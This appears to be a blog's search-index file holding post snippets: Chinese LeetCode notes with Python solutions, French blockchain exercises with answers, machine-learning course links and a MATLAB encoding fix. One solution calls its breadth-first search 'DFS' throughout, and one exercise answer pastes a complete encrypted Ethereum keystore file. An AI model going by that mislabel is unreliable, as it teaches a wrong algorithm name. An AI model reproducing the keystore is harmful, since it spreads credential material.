float(&#39;inf&#39;): # 如果有节点不可到达，返回 -1 return -1 res = max(res, dist) return res1514. Path with Maximum Probability这道题对比于常规的 Dijkstra 算法来说，只是把权重相加变成了概率相乘。同时由于概率要取最大，而数据结构有时只能限制使用最小堆，所以需要把从起点到各个节点的概率取反即可。class Solution: def maxProbability(self, n: int, edges: List[List[int]], succProb: List[float], start: int, end: int) -&amp;gt; float: # 构造邻接表 graph = [[] for _ in range(n)] for i, edge in enumerate(edges): proba = succProb[i] graph[edge[0]].append((edge[1], proba)) graph[edge[1]].append((edge[0], proba)) # 定义：proba_to[i] 的值就是起点 start 到达节点 i 的中最大概率 proba_to = [0 for _ in range(n)] # base case，start 到自己的概率为 -1 # 因为 Python 不提供最大堆的实现 # 所以所有概率用对应的负数表示 # 最终输出最小值 proba_to[start] = -1 # 使用优先级队列决定节点遍历优先级，proba_from_start 较小的排在前面 pqueue = [(-1, start)] heapify(pqueue) while pqueue: curr_proba_from_start, curr_node_id = heapq.heappop(pqueue) if curr_node_id == end: return - curr_proba_from_start if curr_proba_from_start &amp;gt; proba_to[curr_node_id]: continue # 将 curNode 的相邻节点装入队列 for neighbor in graph[curr_node_id]: neighbor_id = neighbor[0] proba_to_next_node = - abs(proba_to[curr_node_id] * neighbor[1]) # 更新 proba_to 列表 if proba_to[neighbor_id] &amp;gt; proba_to_next_node: proba_to[neighbor_id] = proba_to_next_node heapq.heappush(pqueue, (proba_to_next_node, neighbor[0])) return 01631. Path With Minimum Effort这道题也是使用 Dijkstra 算法做，稍微对代码进行更改即可。首先，问题变成二维，对于节点的描述变成二元坐标(i, j)。在路径前进的过程中，需要记录的是路径上的体力消耗，Effort，也就是最大高度差。更改结果数组min_effort的定义：min_effort[i][j]保存的是从起点到点(i,j)的最小体力消耗，也就是需要从所有路径中挑出体力消耗最少的那一条。颇有动态规划的味道。而实际上这就是动态规划。class Solution: def minimumEffortPath(self, heights: List[List[int]]) -&amp;gt; int: rows = len(heights) cols = len(heights[0]) # min_effort[i][j] 的值就是起点 (0,0) 到达位置 (i,j) 的最小体力消耗 min_effort = [[float(&#39;inf&#39;)]*cols for _ in range(rows)] # base case，到达起点的最小 effort 是 0 min_effort[0][0] = 0 # 使用优先级队列决定节点遍历优先级，effort 较小的排在前面 # 从起点开始 BFS pqueue = [(0, 0, 0)] heapify(pqueue) while pqueue: # 取出队列中最小 effort 的坐标 curr_effort, curr_row, curr_col = heappop(pqueue) if curr_row == rows - 1 and curr_col == cols - 1: return curr_effort # 如果已经存在消耗更小的路径，则跳过 if curr_effort &amp;gt; min_effort[curr_row][curr_col]: continue # 将相邻上下左右四个位置装入队列 for dist_row, dist_col in [(-1, 0), (1, 0), (0, -1), (0, 1)]: # 计算下个位置的坐标 next_row, next_col = curr_row + dist_row, curr_col + dist_col if next_row &amp;lt; 0 or next_row &amp;gt;= rows or next_col &amp;lt; 0 or next_col &amp;gt;= cols: # 如果坐标不合法则跳过 continue # 计算当前位置和下个位置的高度差 new_diff = abs(heights[next_row][next_col] - heights[curr_row][curr_col]) # 计算到下一个位置的 effort effor_next_step = max(new_diff, curr_effort) # 更新 min_effort 列表， 如果已存在 effort 更小的路径则不入队 if min_effort[next_row][next_col] &amp;gt; effor_next_step: min_effort[next_row][next_col] = effor_next_step heappush(pqueue, (effor_next_step, next_row, next_col)) return min_effort[-1][-1]1345. 跳跃游戏 IV虽然这道题题干中输入数据是以数组的形式存储，但实际上下标与下标之间的 jump 实际上就可以等价于节点相连。所以这道题的数据可以转换为一张无向无权图，目标就是找到起点到终点的最短路径。所以思路就变得很清晰了：DFS + 剪枝。我们使用 difaultdict 来存储相同值的索引，作为类似于邻接表一样的结构。在这里需要注意，在 DFS 遍历到一个索引时就将所有和该索引具有相同值的索引推到队列中，然后要删除该索引，这样才不会重复遍历这些索引判断是否需要将其推入栈。虽然会有 visitedIndex 集合来保证这些重复索引不会被推入栈，但是在相同值的索引数量太多的时候，还是需要$O(n^2)$的时间复杂度去判断，所以需要过河拆桥。然后实现 DFS，这里我掉进了一个大坑：DFS 需要一个队列，而 Python 中队列的实现有好多种： 双端队列 q = collections.deque()，使用 q.addpend() 和 q.popleft() 方法来进出队列； 列表 q = []，使用 q.addpend() 和 q.pop(0) 方法来进出队列； 同上，使用列表，但是出队列使用读取索引加 q = q[1:] 的方法来更新队列。 第一个方法的时间复杂度是 $O(1)$，第二个和第三个的方法是 $O(n)$。原因在于列表在使用 pop(i) 方法之后，只要 i 不是最后一个元素的索引，列表就需要将删除元素往后的所有元素前向移位一格，所以时间复杂度为 $O(n)$。第三个方法一样，需要逐个元素复制，一样消耗时间。所以队列一定要用 collections.deque 来实现。参考代码如下：class Solution: def minJumps(self, arr: List[int]) -&amp;gt; int: # 用来记录相同值的索引的 dict indexSameValue = defaultdict(list) # 补充记录下跳跃点的信息 # 并且删除无用的索引（和前后索引值相同的索引） arrReduced = [] count = 0 for i, value in enumerate(arr): if 0 &amp;lt; i &amp;lt; len(arr) - 1 and value == arr[i-1] and value == arr[i+1]: continue else: indexSameValue[value].append(count) arrReduced.append(value) count += 1 arr = arrReduced # 创建辅助用数据结构 visitedIndex = [False] * count visitedIndex[0] = True # 双端队列更快！！ q = deque() q.append((0,0)) # DFS while q: # DFS 的当前位置 idx, step = q.popleft() # 如果到达终点，则输出当前步数 if idx == count - 1: return step value = arr[idx] # 遍历所有相同值的索引，也就是跳跃 for next_idx in indexSameValue[value]: if not visitedIndex[next_idx]: q.append((next_idx, step + 1)) visitedIndex[next_idx] = True # 过河拆桥，避免重复判断 del indexSameValue[value] # 把后一个索引加入队列 if idx + 1 &amp;lt; count and not visitedIndex[idx + 1]: q.append((idx + 1, step + 1)) visitedIndex[idx + 1] = True # 把前一个索引加入队列 if 0 &amp;lt;= idx - 1 and not visitedIndex[idx - 1]: q.append((idx - 1, step + 1)) visitedIndex[idx - 1] = True" }, { "title": "LeetCode 刷题记录 - 数据结构之链表（Linked List）", "url": "/posts/LeetCode_linked_list/", "categories": "Blogging, LeetCode", "tags": "LeetCode, Linked list", "date": "2021-12-28 04:26:00 +0800", "snippet": " 参考链接：一文搞懂单链表的六大解题套路21. Merge Two Sorted Lists方法：双指针小技巧：代码中还用到一个链表的算法题中是很常见的「虚拟头结点」技巧，也就是 dummy 节点。你可以试试，如果不使用 dummy 虚拟节点，代码会复杂很多，而有了 dummy 节点这个占位节点，可以避免处理空指针的情况，降低代码的复杂性。# Definition for singly-linked list.# class ListNode:# def __init__(self, val=0, next=None):# self.val = val# self.next = nextclass Solution: def mergeTwoLists(self, list1: Optional[ListNode], list2: Optional[ListNode]) -&amp;gt; Optional[ListNode]: curr = dummy = ListNode() pt1 = list1 pt2 = list2 while pt1 and pt2: if pt1.val &amp;gt; pt2.val: curr.next = pt2 pt2 = pt2.next else: curr.next = pt1 pt1 = pt1.next curr = curr.next if pt1: curr.next = pt1 if pt2: curr.next = pt2 return dummy.next23. Merge k Sorted Lists思路同上题，关键是如何每一步从k个ListNode里面选出最小的那一个。这里使用了一个数据结构，叫做优先级队列。这个队列是基于二叉堆（最小堆）实现的，可以通过从队列中取出最小的Node然后把Node.next再添加进队列里来保证持续获得最小的Node。queue这个包就提供了可以直接调用的PriorityQueue类。由于官方的ListNode类没有重载比较符，所以直接把链表节点加入队列会报错。为了保证队列能正常运作，使用三元元组来作为存储对象，保证第二个元素唯一即可（这里用的是链表索引）。因为元组的比较规则是按照元素逐个比较，当前元素相等的话会比较第二个，所以只要第二个元素唯一，就不会比较第三个元素，即我们的ListNode。参考代码如下：import queueclass Solution: def mergeKLists(self, lists: List[Optional[ListNode]]) -&amp;gt; Optional[ListNode]: pqueue = queue.PriorityQueue() curr = dummy = ListNode() for i, head in enumerate(lists): if head is not None: pqueue.put((head.val, i, head)) while not pqueue.empty(): _, i, curr.next = pqueue.get() curr = curr.next if curr.next is not None: pqueue.put((curr.next.val, i, curr.next)) return dummy.next其实使用list类加上heapq包也可以实现优先级队列， 并且这个方法更快。代码参考如下，这里元组第二个元素用count来保证唯一性：import heapqclass Solution: def mergeKLists(self, lists: List[ListNode]) -&amp;gt; ListNode: curr = head = ListNode(0) queue = [] count = 0 for l in lists: if l is not None: count += 1 heapq.heappush(queue, (l.val, count, l)) while len(queue) &amp;gt; 0: _, _, curr.next = heapq.heappop(queue) curr = curr.next if curr.next is not None: count += 1 heapq.heappush(queue, (curr.next.val, count, curr.next)) return head.next 参考资料：优先级队列和堆（一）19. Remove Nth Node From End of List最简单的思路就是遍历两遍，第一遍确定节点数量，第二遍寻找倒数第n个节点。但是我们肯定是希望只遍历一遍的。思路并不难，用两个指针去遍历，当第一个指针已经走了n步之后，再让第二个指针从头指针跟上，这样一来，当第一个指针走到末尾的时候，第二个指针刚好走到倒数第n个节点的位置。class Solution: def removeNthFromEnd(self, head: Optional[ListNode], n: int) -&amp;gt; Optional[ListNode]: # 为方便代码，创建一个虚拟头指针 dummy = ListNode() dummy.next = head # 两个指针的起始点都是dummy pt1 = dummy pt2 = dummy # 首先让指针pt1走出n步 count = 0 while count &amp;lt; n: pt1 = pt1.next count += 1 # 指针pt2和pt1开始同步走 while pt1.next: pt1 = pt1.next pt2 = pt2.next # 删除节点并返回 pt2.next = pt2.next.next return dummy.next876. Middle of the Linked List技巧：快慢指针快指针一次走两步，慢指针一次走一步。class Solution: def middleNode(self, head: Optional[ListNode]) -&amp;gt; Optional[ListNode]: dummy = ListNode(next=head) pt_fast = pt_slow = dummy while pt_fast.next and pt_fast.next.next: pt_fast = pt_fast.next.next pt_slow = pt_slow.next return pt_slow.next141. Linked List Cycle技巧：快慢指针当快指针追上慢指针的时候，说明存在环，否则快指针会遍历到链表末尾。class Solution: def hasCycle(self, head: Optional[ListNode]) -&amp;gt; bool: dummy = ListNode(next=head) pt_slow = pt_fast = dummy while pt_fast.next and pt_fast.next.next: pt_fast = pt_fast.next.next pt_slow = pt_slow.next # 快慢指针相遇 if pt_fast == pt_slow: return True return False142. Linked List Cycle II和上一题思路一样，快慢指针，只是在两指针相遇之后还需要求得环开始的节点。这里需要一点点数学证明，可以得到的结论是：当快慢指针相遇时，让其中一个指针返回dummy节点，两个指针再同速继续前进，那么再次相遇的位置就是环开始的节点。class Solution: def detectCycle(self, head: Optional[ListNode]) -&amp;gt; Optional[ListNode]: dummy = ListNode(next=head) pt_slow = pt_fast = dummy while pt_fast.next and pt_fast.next.next: pt_fast = pt_fast.next.next pt_slow = pt_slow.next # 快慢指针相遇 if pt_fast == pt_slow: # 慢指针返回dummy节点 pt_slow = dummy # 两指针同速前进 while pt_fast.next: pt_fast = pt_fast.next pt_slow = pt_slow.next # 再次相遇即为环开始节点 if pt_fast == pt_slow: return pt_slow return None160. Intersection of Two Linked Lists有两个思路，第一个比较传统，但是效果好：各遍历一遍两个链表，计算出长度差，然后让两个链表从同一个起点开始前进，就能同一时间进入交叉节点。class Solution: def getIntersectionNode(self, headA: ListNode, headB: ListNode) -&amp;gt; Optional[ListNode]: # 计算A链表长度 a_len = 0 a = headA while a: a_len += 1 a = a.next # 计算B链表长度 b_len = 0 b = headB while b: b_len += 1 b = b.next # 统一起始节点 a = headA b = headB lag = a_len - b_len if lag &amp;gt; 0: for i in range(lag): a = a.next else: for i in range(abs(lag)): b = b.next # 同时前进 while a and b and a != b: a = a.next b = b.next return a第二个思路也是相似，同时进入交叉点。让指针p1遍历完headA之后去遍历headB，然后p2遍历完headB去遍历headA，这样两个指针就能同时进入交叉节点了。class Solution: def getIntersectionNode(self, headA: ListNode, headB: ListNode) -&amp;gt; Optional[ListNode]: p1 = headA p2 = headB while p1 != p2: if p1 is None: p1 = headB else: p1 = p1.next if p2 is None: p2 = headA else: p2 = p2.next return p1206. Reverse Linked List常规思路很简单，直接遍历，用临时变量存储前后节点，每一个循环里反转前后节点的指向关系。class Solution: def reverseList(self, head: Optional[ListNode]) -&amp;gt; Optional[ListNode]: node = head pre_node = None # 循环遍历 while node: # 临时存储后一个节点 curr_head = node.next # 当前节点指向前一个结点 node.next = pre_node # 更新临时节点 pre_node = node node = curr_head return pre_node同时也可以用递归实现，虽然比较慢，但是对思维是很好的锻炼。递归函数reverse定义：输入一个节点head，将「以head为起点」的链表反转，并返回反转之后的头结点。class Solution: def reverseList(self, head: Optional[ListNode]) -&amp;gt; Optional[ListNode]: if head is None: return None # 使用递归函数 def reverse(node): # base case if node.next is None: return node # 反转以下一个节点为头节点的链表 last = reverse(node.next) # 更改指向 node.next.next = node node.next = None return last return reverse(head)92. Reverse Linked List II上一题的进阶版，引入参数left和right来翻转节点索引从left到right范围内的链表（头节点索引为 1 ）。需要分步实现两个递归函数： reverseN(head, n)：翻转链表前N个节点。 reverseBetween(head, m, n)：给出一个索引区间 [m,n]（索引从 1 开始），仅仅反转区间中的链表节点的函数。 两个函数的实现思路如下，reverseN(head, n)的思路是将n作为递归函数的参数传递下去，每次调用在当前节点进行翻转，并将n减一，到达n == 1的 base case 时返回并记录后驱节点，为了将翻转后的链表的尾巴接上去。reverseBetween(head, m, n)的思路是持续前进到反转的起点，也就是直到触发m == 1的 base case，从当前的head位置调用reverseN(head, n)。class Solution: def reverseBetween(self, head: Optional[ListNode], left: int, right: int) -&amp;gt; Optional[ListNode]: successor = None # 翻转前N个节点 def reverseN(head, n): # 后驱节点 nonlocal successor # base case if n == 1: successor = head.next return head # 逐节点翻转 last = reverseN(head.next, n-1) head.next.next = head head.next = successor return last # 翻转从m到n的节点 def reverseBetween(head, m, n): if m == 1: return reverseN(head, n) else: head.next = reverseBetween(head.next, m-1, n-1) return head return reverseBetween(head, left, right)递归操作链表并不高效。和迭代解法相比，虽然时间复杂度都是 O(N)，但是迭代解法的空间复杂度是 O(1)，而递归解法需要堆栈，空间复杂度是 O(N)。所以递归操作链表可以作为对递归算法的练习，但是考虑效率的话还是使用迭代算法更好。25. Reverse Nodes in k-Group使用迭代遍历的思路来做，比较简单。首先实现上上题206. Reverse Linked List的翻转整个链表的函数，然后遍历链表。使用count来计数，当满足条件count == k时触发翻转，但是需要提前存下上一个group的尾节点以及下一个group的头节点。翻转完后返回新的当前group的头节点和末节点，再和前后两个group重新建立连接即可。整体时间复杂度为$O(N)$。参考代码如下：class Solution: def reverseKGroup(self, head: Optional[ListNode], k: int) -&amp;gt; Optional[ListNode]: # 翻转整个链表的函数 def reverse(head): curr_node = head pre = None while curr_node: temp = curr_node.next curr_node.next = pre pre = curr_node curr_node = temp return pre, head # 创建虚拟头节点 dummy = ListNode(next = head) curr_node = end_of_last_group = dummy # 使用count计数 count = 0 while curr_node.next: curr_node = curr_node.next count += 1 # 当count等于k时触发翻转 if count == k: # 保存下一个group的头节点 head_of_new_group = curr_node.next # 断开两个group之间的链接 curr_node.next = None # 翻转整个group的节点 curr_head, curr_end = reverse(end_of_last_group.next) # 上一个group的尾节点接上反转后的group end_of_last_group.next = curr_head # 连上下一个group的头节点 curr_end.next = head_of_new_group # 重置count count = 0 # 现在的group的尾节点成为新的end_of_last_group end_of_last_group = curr_node = curr_end return dummy.next234. Palindrome Linked List判断链表是不是回文链表。这道题大可以直接把链表的元素存储到数组中再判断，但是这样就失去了链表的意义同时时间复杂度也不低。作为一个练习，其实这道题可以很好地应用之前关于链表的操作知识：寻找中点，翻转链表等等。思路也不难： 首先使用快慢指针找到链表中点 然后翻转后半段链表 同时遍历两个链表，逐个节点比较即可 class Solution: def isPalindrome(self, head: Optional[ListNode]) -&amp;gt; bool: # 找到链表中点 slow = fast = head while fast and fast.next: slow = slow.next fast = fast.next.next # 现在慢指针所指向的是后半段链表 # 翻转后半段链表 prev = None while slow: slow.next, slow, prev = prev, slow.next, slow # 现在 prev 是后半段链表的头节点 first = head second = prev while first and second: if first.val != second.val: return False first = first.next second = second.next return True24. Swap Nodes in Pairs一道相对简单的题目，每两个 node 交换一下位置。思路就是创建虚拟头指针，从虚拟指针开始，以步长为二遍历链表，每次都交换指针后两个链表的位置。基本要注意的就是交换的顺序问题。class Solution: def swapPairs(self, head: ListNode) -&amp;gt; ListNode: # 创建虚拟头指针 node = dummy = ListNode(next=head) # 遍历直到倒数第二个或者最后一个节点 while node.next and node.next.next: # 交换后两个节点的位置 next_node = node.next.next node.next.next = next_node.next next_node.next = node.next node.next = next_node # 跳过一个节点 node = next_node.next return dummy.next61. Rotate List读题后可以使用前后双指针解决。唯一需要注意的细节就是k的取值上限远大于链表的长度上限，所以需要先取模求出去掉重复旋转的实际偏转值k_pure。然后使用前后相隔k_pure步的两个指针遍历链表，当走得快的指针到底之后，把两个指针之间的节点全部接在链表头部即可完成任务。class Solution: def rotateRight(self, head: Optional[ListNode], k: int) -&amp;gt; Optional[ListNode]: # 特殊情况 if k == 0 or not head: return head # 虚拟头指针 dummy = ListNode(next=head) # 计算节点数量 count = 0 node = dummy.next while node: node = node.next count += 1 # 计算取余后的实际旋转节点数 k_pure = k % count # 如果旋转数为 0，则返回原链表 if k_pure == 0: return head # 使用前后相隔 k_pure 个节点的双指针 # 指针 1 走了 k_pure 步之后指针 2 开始走 count = 0 node_1 = dummy while (count &amp;lt; k_pure): count += 1 node_1 = node_1.next node_2 = dummy # 同步前进 while(node_1.next): node_1 = node_1.next node_2 = node_2.next # 指针1到头时将两个指针之间的部分链表前部 node_1.next = dummy.next dummy.next = node_2.next node_2.next = None return dummy.next83. 删除排序链表中的重复元素给的是一个递增数组，删除其中重复的元素。直接遍历，当后一个节点的值等于当前节点时，直接删除后一个节点即可。class Solution: def deleteDuplicates(self, head: ListNode) -&amp;gt; ListNode: # 虚拟头指针 dummy = ListNode(val=-101, next=head) curr_node = dummy while curr_node.next: # 当下一个节点的值等于前一节点时，就删除下一个节点 if curr_node.next.val == curr_node.val: curr_node.next = curr_node.next.next else: curr_node = curr_node.next return dummy.next82. 删除排序链表中的重复元素 II上一题的升级版，要求只保留不重复的元素多加几个步骤把第一个重复元素也删除就行了class Solution: def deleteDuplicates(self, head: ListNode) -&amp;gt; ListNode: # 虚拟头指针 dummy = ListNode(val=-101, next=head) curr_node = dummy # 指示当前节点是否是重复节点 delete_curr = False pre_node = None while curr_node.next: if curr_node.next.val == curr_node.val: # 当后驱节点等于当前节点时，删除后驱节点并标记当前节点 curr_node.next = curr_node.next.next delete_curr = True else: # 否则，判断当前节点是否需要删除 if delete_curr: # 当前节点是重复节点，删除 pre_node.next = curr_node.next curr_node = pre_node.next else: # 当前节点不是重复节点，不删除 pre_node = curr_node curr_node = curr_node.next delete_curr = False if delete_curr: pre_node.next = curr_node.next return dummy.next" }, { "title": "区块链 - 区块链技术", "url": "/posts/Block_chain/", "categories": "Blogging, Block chain", "tags": "Block chain", "date": "2021-12-17 08:57:00 +0800", "snippet": "2021 12 10 - Introduction首先区块链是一个分布式系统。一文看懂｜分布式系统之CAP理论工作量证明PoW工作量证明的意义wiki: 工作量证明参考资料blockchain.combtc.commyetherwallet.com大白话科普区块链原理【子豪兄区块链讲义】" }, { "title": "区块链 - 区块链技术习题", "url": "/posts/Block_chain_exercices/", "categories": "Blogging, Block chain", "tags": "Block chain", "date": "2021-12-16 12:07:00 +0800", "snippet": "参考资料blockchain.combtc.commyetherwallet.com大白话科普区块链原理【子豪兄区块链讲义】习题1 - MD5 “BLOCKCHAIN”Q: Quel est le MD5 de la chaîne de 10 caractères en majuscule BLOCKCHAIN ? Combien de bits (binary digits) fait ce hash ?A:MD5 de “BLOCKCHAIN”: e4b25d8c911628d527b2c97039a9f593nombre de bits: 1282 - SHA3 “BLOCKCHAIN”Q:Quel est le SHA3-256 la chaîne de 10 caractères en majuscule BLOCKCHAIN ?A:bd6af45b03ce764acba7f330ddb9383325f2ce48e0d1708207c2ea01c7855b973 - Collision SHA3Q:Combien d’opérations sont en moyenne nécessaires pour trouver une collision sur SHA3-256 ?A:3.4028237e+384 - H99 - hashage de 5432Q:Soit la fonction de hashage d’entiers H99(i) définie comme i modulo 99. Ses qualités cryptographiques sautent aux yeux. Que vaut H99(5432) ?A:865 - H99 - inversionQ:Quel est le premier entier supérieur à 1000 dont le H99 vaut 0 ?A:10896 - H99 - arbre de MerkleQ:Quelle est la racine de l’arbre binaire de Merkle calculé sur les feuilles 1234 5678 9876 5430 avec la fonction H99 ?On aggrégera les hashs à chaque niveau en concaténant simplement les représentations décimales. Il y a 7 hashs à calculer au total.À quoi peut faire penser ce résultat ? 😉A:4635 7584 8160 42La grande question sur la vie, l’univers et le reste7 - Hash - preuve de MerkleQ:Soit la fonction de hash h, les éléments e0 à e3 dont les hashs sont f0 = h(e0) à f3 = h(e3), et les hashs de l’arbre binaire de Merkle r1 = h(f0 . f1), r2 = h(f2 . f3), r0 = h(r1 . r2) (. est la concaténation).Quelle formule démontre que l’élément e2 appartient à l’arbre de Merkle de racine r0 ?A:f2 = h(e2)r2 = h(f2.f3)r0 = h(r1.r2)8 - BTC - fonction de hashQ:Quelle fonction de hashage est utilisée par bitcoin ?A:SHA-2569 - BTC - premier blockQ:Quel est le numéro du premier bloc bitcoin ?A:010 - BTC - bloc précédentQ:Quel est le hash du bloc précédent du premier bloc (bloc qui n’existe pas, bien sûr) ?A:011 - BTC - date du premier blocQ:À quelle date ce bloc a-t-il été généré ?A:3 janvier 200912 - BTC - rémunération du premier blocQ:Combien de bitcoins ont été créés par le minage du premier bloc ?A:50 btc13 - BTC - bloc 210000Q:Quel est la particularité du bloc numéro 210000 ?A:25 BTC de rémunération14 - BTC - rémunération 12.5Q:À quel bloc la rémunération des mineurs est-elle passée à 12.5 BTC ?A:42000015 - BTC - rémunération 6.25Q:À quel bloc la rémunération des mineurs de bitcoins est-elle passée à 6.25 ETC ?A:63000016 - BTC - minage de bloc 561744Q:Combien de temps a duré le minage du block 561744 ?A:1 second16 - BTC - minage de bloc 561744Q:Combien de temps a duré le minage du block 561744 ?A:1 second17 - BTC - minage du bloc 711651Q:Combien de temps a duré le minage du block 711651 ?A:58 minutes 32 seconds18 - BTC - bloc 666666Q:Regarder le bloc bitcoin 666666. de quand date-t-il ? combien de transactions contient-il ? quel est le montant des bitcoins échangés ?A:January 19, 20212728880.73126915 BTC19 - ETH - rémunération initiale des mineursQ:Quelle est la rémunération statique du 1er bloc de la blockchain Ethereum ?A:5 ETH20 - ETH - nouvelle rémunérationQ:À quel bloc la rémunération des mineurs passe-t-elle à 3 ETH ?A:437000022 - ETH - prénom hexadécimal débile (PHD)Q:Traduisez votre prénom en 4 chiffres hexadécimaux de la façon suivante : Les lettres de A à F sont gardées, puis substituer les autres lettres par des chiffres : 1 pour I J L Y, 2 pour R Z, 3 pour X, 4 pour H K, 5 pour S, 6 pour G, 7 pour P T, 8 pour M N, 9 pour U V W et 0 pour O Q. tronquer après 4 caractèresCalvin est ainsi traduit en “CA1918”, tronqué à “CA19”, Hobbes est “40BBE5” tronqué à “40BB”.Quel est votre PHD ?A:549323 - ETH - création d’un portefeuille vaniteuxQ: Connectez-vous à Vanity Eth pour vous créer un portefeuille Ethereum dont l’adresse commence justement par votre PHD. Choisissez-vous un mot de passe super top secret. Téléchargez et sauvegardez le fichier résultat, et collez-en le contenu ci-après. A:{“address”:”0x549399259eacf2545f98622ace39e369e990dbb2”,”crypto”:{“kdf”:”pbkdf2”,”kdfparams”:{“c”:262144,”dklen”:32,”prf”:”hmac-sha256”,”salt”:”a30aa67e621715c34faeb5b8cacc61e9cf3f455c53b4e932c260f4c2316572ea”},”cipher”:”aes-128-ctr”,”ciphertext”:”6364e71d1bdba2b78651313251a4417f17fb4c5974c92acbbc0f943282849f86”,”cipherparams”:{“iv”:”36fcfa4d4e1e09846afeae353e894b91”},”mac”:”bf32e0202109fa6b15c8e9c952e5967155403f56f41771148b881dca7bbc079b”},”id”:”8c8b7326-cf4e-4d22-a764-da8868bb59c2”,”version”:3}24 - ETH - examen du portefeuille (1)Q:Quel est le format du fichier ?A:json file25 - ETH - examen du portefeuille (2)Q:Quel algorithme de chiffrement est utilisé pour protéger la clef privée ?A:AES26 - ETH - chargement dans MyEtherWalletQ:Aller sur MyEtherWallet pour visualiser votre portefeuille. Quelle est votre adresse Ethereum ?A:0x549399259eacf2545F98622acE39e369e990Dbb227 - ETH - nombre d’octets de l’adresseQ:Combien d’octets fait-elle ?A:2028 - ETH - contenu de l’adresseQ:Pourquoi contient-elle des minuscules et des majuscules ?A:Because an Ethereum address is a 42-character hexadecimal address derived from the last 20 bytes of the public key controlling the account with 0x appended in front.29 - ETH - clef privéeQ:Quelle est la taille de la clef privée en chiffres binaires ?A:256 bits30 - ETH - solde (1)Q:Quel est le solde de votre compte ?A:0.00 ETH31 - ETH - solde (2)Q:Quel était le solde du compte Ethereum 0xAceBabe64807cb045505b268ef253D8fC2FeF5Bc au 1er janvier 2019 ?A:0.2 ETH32 - ETH - solde (3)Q:Quel était le solde du compte Ethereum 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 au 30 novembre 2021 ?A:交易频率太高导致手动难以推算之前的账户余额。33 - ETH - Ethermine (1)Q: Quelle est l’adresse du portefeuille du groupe de mineurs (mining pool) Ethermine ? Depuis quand ce portefeuille est-il utilisé ?A:0xEA674fdDe714fd979de3EdF0F56AA9716B898ec82016/3/2134 - ETH - Ethermine (2)Q:À l’instant où vous répondez à cette question : quel est le numéro du dernier bloc qui contient une transaction impliquant ce compte ?A:1378386735 - ETH - Wrapped Ether 0xc02a…Q: Quel est le solde du compte Wrapped Ether 0xc02a… en ETH ? Quelle est la valeur équivalente (on arrondira au milliard de dollars le plus proche:-)A:7318110.01536ETH30 milliard de dollars" }, { "title": "Machine Learning - ESMI_MES-08 - Apprentissage artificiel", "url": "/posts/Machine-Learning/", "categories": "Blogging, Machine Learning", "tags": "Machine Learning", "date": "2021-12-01 11:53:00 +0800", "snippet": "Fabien MOUTARDECours 1 - Introduction - 11月29日上午logarithmic regression 逻辑回归: 【机器学习】逻辑回归（非常详细）分类问题性能指标:sklearn计算准确率、精确率、召回率、F1 scoreCours 2 - MLP - 11月29日下午优化器：如何理解Adam算法(Adaptive Momentum Estimation)？An overview of gradient descent optimization algorithmsCours 3 - Convolutional network - 11月30日上午如何通俗易懂地解释卷积？常用矩阵微分公式损失函数｜交叉熵损失函数Fast rcnnSoftmaxPointnetA Neural Network Playground - TensorFlowMNIST benchmarkImage Classification benchmark如何解决梯度爆炸与梯度消失 [入门 详解机器学习中的梯度消失、爆炸原因及其解决方法](https://cloud.tencent.com/developer/article/1052770) 神经网络中的权重初始化一览：从基础到Kaiming神经网络中BN层的原理与作用Batch Normalization学习笔记及其实现Cours 4 - Support vector machine - 11月30日下午支持向量机：支持向量机系列上面链接乱码，看这个转载手推SVM（一）-数学推导深入浅出机器学习技法（一）：线性支持向量机 LSVMCours 5 - Clustering - 12月01日上午SVD (Spectral clustering) 谱聚类Gaussian mixtureCours 6 - Random Forests / Boosting - 12月01日下午XGBoost算法的原理详析[文献阅读笔记]详解《XGBoost: A Scalable Tree Boosting System》详解LightGBM两大利器：基于梯度的单边采样（GOSS）和互斥特征捆绑（EFB）Cours 7 - Sequential data / RNNOPTUNARNN/LSTM BPTT详细推导以及梯度消失问题分析人人都能看懂的 LSTM人人都能看懂的 GRU" }, { "title": "Matlab - 解决 MATLAB 打开 .m 文件后注释乱码的问题", "url": "/posts/Matlab-GBK-UTF-8-encoding/", "categories": "Blogging, Matlab", "tags": "Matlab", "date": "2021-11-23 16:21:00 +0800", "snippet": "MATLAB高版本(2017a以上)存在的两种编码格式编码格式修改(GBK改为UTF-8)MATLAB高版本(2017a以上)存在的两种编码格式GBK和UTF-8。编码格式修改后可能会导致现有m文件乱码问题解决，但原有注释乱码的问题。编码格式修改(GBK改为UTF-8)首先，命令窗口输入：slCharacterEncoding()；用于查看现在的MATLAB编码格式，将GBK改为UTF-8步骤如下：一、打开MATLAB安装路径下的D:\\Matlab2018b\\bin的lcdata_utf8.xml文件；二、找到以下代码段，删除 &amp;lt;encoding name=&quot;GBK&quot;&amp;gt; &amp;lt;encoding_alias name=&quot;936&quot;/&amp;gt; &amp;lt;/encoding&amp;gt;三、找到以下代码段： &amp;lt;encoding name=&quot;UTF-8&quot;&amp;gt; &amp;lt;encoding_alias name=&quot;utf8&quot;/&amp;gt; &amp;lt;/encoding&amp;gt;在第二、三行之间插入一句：&amp;lt;encoding_alias name=&quot;GBK&quot;/&amp;gt;四、文件另存为：lcdata.xml（若bin目录下原有该文件，可先将其另外重命名，因为在将UTF-8改为GBK时可能会用到）五、重启MATLAB即可，此时输入slCharacterEncoding()；得到ans=‘UTF-8’，修改完毕。若将UTF-8改为GBK，反向执行上述操作即可。注意：1、将UTF-8改为GBK后可能导致原有m文件中的备注乱码，但英文备注一般不会乱码；2、修改XML文件时注意输入格式(特别是双引号输入法格式)，否则会导致程序无法运行；2、一般，UTF-8应用更为广泛，建议改为该编码格式。参考：解决MATLAB2018b打开m文件后注释乱码的问题" }, { "title": "LeetCode 刷题记录 - Binary Tree", "url": "/posts/LeetCode_binary_tree/", "categories": "Blogging, LeetCode", "tags": "LeetCode, Binary tree", "date": "2021-11-02 11:47:00 +0800", "snippet": " 95. Unique Binary Search Trees II给定一个整数 n，生成一个包含所有由值为 1 到 n 的节点组成的 BST 的 list。已知 BST 的性质：每一个节点的左子树节点的值都小于该节点，其右子树节点的值都大于等于该节点。那么根据该性质，则可以构建一个递归函数helper，该函数以两个指针i，j作为输入，输出由range(i,j+1)这个范围的数构成的所有可能 BST 的 list。在该递归函数内部，首先遍历range(i,j+1)，选择一个数k作为root，然后遍历helper(i, k-1)输出的元素作为左子树，遍历helper(k+1, j)输出的元素作为右子树，然后就可以构造新的节点TreeNode(val=k, left=left_node, right=right_node)。最后将这些新构造的节点逐个添加到 list 即可。# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: 